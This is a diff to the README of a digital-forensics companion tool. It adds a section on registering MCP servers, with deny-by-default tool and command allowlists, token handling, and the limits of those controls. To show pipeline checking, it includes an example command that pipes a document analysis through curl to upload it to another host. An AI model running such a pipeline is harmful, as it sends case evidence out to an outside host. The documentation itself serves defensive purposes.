@@ -40,6 +40,7 @@ User Manual: https://hasamba.github.io/DFIR-Companion/manual/
 - [Screenshots](#screenshots)
 - [What it produces](#what-it-produces)
 - [Features](#features)
+- [Registering an MCP server](#registering-an-mcp-server)
 - [Repository layout](#repository-layout)
 - [How the pieces fit](#how-the-pieces-fit)
 - [Environment variables (`companion/.env`)](#environment-variables-companionenv)
@@ -238,6 +239,7 @@ list of known compromised hosts and users.
 - **Import screenshots** — multi-select PNG/JPEG/WebP; single **Import** button auto-detects artifact format (CSV/JSON/log)
 - **Evidence drop folder** — each case has a `drop/` folder; anything copied in (subfolders included) is auto-imported in the background via the same chain as the Import button (images → screenshot evidence), then moved to `_processed/` or `_failed/`; failures surface in a dashboard banner + notifications; every outcome (imported/failed/pending, with reason) is appended to a running `drop-log.txt` in the same folder
 - **External tool runner** (Settings → Tools) — run your **own locally-installed** Hayabusa / Velociraptor CLI / Suricata / Snort / YARA against raw evidence the Companion can't parse (EVTX/PCAP/files), then ingest the tool's *output* through the existing importers. Configure the binary path + args per tool (never bundled/downloaded). Importing a raw EVTX/PCAP from the dashboard — or dropping raw files in a case's `drop/` folder — shows a header banner that **asks once per batch** before running (auto-run is opt-in per tool); each tool also has a one-click "update rules" button. **Add your own custom tools** too (name, binary, command, update command, extensions) — their output is auto-detected and routed to the right importer. No-shell argv, path-contained, runs from the tool's own dir, off by default
+- **MCP server registry** (Settings → Tools) — register **your own** MCP servers (SIFT, REMnux, windows-triage) so case evidence can be pointed at them; the Companion never bundles, installs or hosts one. Bearer tokens live in `.env` as `DFIR_MCP_<ID>_TOKEN` (never in the registry JSON, redacted in Settings); `http://` is permitted to a private-network host and rejected to a public one. Each server carries a **tool allowlist** (empty = nothing may run) and a **command allowlist**. Read [Registering an MCP server](#registering-an-mcp-server) before adding one that exposes a command runner — doing so grants command execution on that host
 - **Import undo/redo** — roll back/forward to exact pre-import state (no re-synthesis); multi-level per-case stack
 - **Custom (declarative) importers** — teach a new file format with a JSON definition (no code); LLM-authorable via a built-in prompt, auto-detected + imported like a built-in, with built-in/custom precedence
 - **Evidence-first** — written to disk + audit log before analysis; SHA-256 dedup (disable via `DFIR_DEDUP=off`)
@@ -429,6 +431,62 @@ All importers are **deterministic (no AI call)**, read the artifact's own timest
 - **Customizable prompts** — override prompts via env var or file; edits apply without restart
 - **Demo case** — one-click load or `npm run seed-demo` to seed GlobalTech scenario
 - **CLI scripts** — `reanalyze`, `synthesize`, `coverage`, `verify:ai`, `clean-timeline`
+
+## Registering an MCP server
+
+The Companion can call MCP servers **you** run — a SIFT workstation, a REMnux box, a Windows triage
+baseline service — so case evidence can be analysed on a machine that has the tooling. It never
+bundles, installs, hosts or updates one. Same rule as the external tool runner: you own the tooling.
+
+Register a server in **Settings → Tools**, or `POST /mcp/servers` with a label and URL. Then
+`POST /mcp/servers/<id>/probe` to handshake and list what it offers.
+
+### Read this before registering a server that runs commands
+
+**Allowing a tool is not the same as allowing a task.** Some MCP servers expose fine-grained tools —
+`check_service`, `check_autorun`, one per question. Others expose a single *command runner* that
+executes whatever you hand it. SIFT's `run_command` states it can execute "most SIFT-installed tools
+… including curl, wget, dd, fdisk, and python3"; REMnux's `run_tool` takes an entire shell pipeline.
+
+**Permitting one of those tools grants command execution on that host.** That is a reasonable thing
+to accept on an isolated forensics network, where the analysis boxes are yours and the evidence is
+already on your LAN. It is not a reasonable thing to do anywhere else, and no amount of
+configuration here changes that — the trust boundary is the network, not the allowlist.
+
+Two allowlists bound what a registered server may do:
+
+| Setting | Applies to | Empty means |
+|---|---|---|
+| **Allowed tools** | every server | **nothing may run** — name each tool you want |
+| **Allowed commands** | calls that carry a command argument | **no command may run** — name each binary |
+
+Both deny by default, because the risk of a control that is off until configured is that it stays
+off. The command allowlist is only consulted when a call actually carries a command, so a server
+with fine-grained tools needs no command allowlist at all.
+
+Commands are matched **by basename**, so `grep` and `/usr/bin/grep` are one rule. Every stage of a
+pipeline is checked, not just the first — `oledump.py s.doc | curl -T - http://elsewhere` needs both
+`oledump.py` and `curl` permitted. A command using shell substitution (`$(…)`, backticks, `${…}`) is
+refused outright, because what it would run cannot be known in advance.
+
+**What the command allowlist does not do.** It bounds *which* binaries run, never what a permitted
+one can do. Permitting `dd` permits writing to any path that server's user can write to; permitting
+`python3` permits arbitrary code. It also keys on well-known parameter names (`command`, `cmd`,
+`argv`) — a server that names its command parameter something unusual is not caught. That is an
+accepted limit: the control exists so an operator does not *under-estimate* the reach they granted,
+not to contain a server that is actively hostile. Do not register a server you would not trust to
+describe its own tools honestly.
+
+### Tokens
+
+Bearer tokens are **not** stored in the registry JSON. They live in `.env` as
+`DFIR_MCP_<ID>_TOKEN` — e.g. a server with id `sift` reads `DFIR_MCP_SIFT_TOKEN` — which keeps them
+out of git and behind the same redaction every other secret gets in Settings. Save one and
+`POST /mcp/reconnect` applies it without a restart.
+
+Server URLs are validated the way AI provider URLs are: `http://` is permitted to a loopback or
+private-network host (the deployment these servers actually use) and rejected to a public one, where
+the token and evidence would cross the internet in the clear.
 
 ## Repository layout
 
@@ -856,6 +914,15 @@ uploaded JSON report** (e.g. THOR/Hayabusa via `Generic.Scanner.ThorZIP` — for
 uploaded JSON does; it's auto-detected and routed to the right importer), then synthesizes — or click **Collect
 now** on the live job card to pull early. The in-flight job persists per case (`state/velo-hunt.json`) and
 survives a server restart; results appear on the dashboard timeline/IOCs.
+
+### MCP servers (optional)
+
+| Variable | Default | Description |
+|---|---|---|
+| `DFIR_MCP_<ID>_TOKEN` | — | Bearer token for the registered MCP server with that id — e.g. `DFIR_MCP_SIFT_TOKEN` for a server whose id is `sift`. The server list itself lives in `tools/mcp-servers.json` beside `cases/`; only the token belongs in `.env`, where it is redacted in Settings like every other secret. Save one and `POST /mcp/reconnect` applies it without a restart. |
+
+Registering a server is a security decision, not just configuration — see
+[Registering an MCP server](#registering-an-mcp-server).
 
 ### Notifications (optional)
 
